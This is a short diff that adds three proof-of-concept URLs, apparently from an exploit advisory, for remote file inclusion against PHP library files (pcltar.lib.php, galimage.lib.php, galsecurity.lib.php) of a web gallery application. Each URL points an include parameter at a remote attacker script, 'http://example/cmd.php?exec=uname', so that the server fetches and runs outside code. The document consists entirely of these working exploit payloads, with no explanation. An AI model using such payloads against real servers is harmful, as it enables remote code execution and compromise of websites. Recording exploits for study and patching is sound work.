@@ -1,0 +1,3 @@
+http://www.example.com/[mg_path]/pcltar.lib.php?g_pcltar_lib_dir=http://example/cmd.php?exec=uname
+http://www.example.com/[mg_path]/galimage.lib.php?listconfigfile[0]=http://example/cmd.php?exec=uname
+http://www.example.com/[mg_path]/galsecurity.lib.php?listconfigfile[0]=http://example/cmd.php?exec=uname
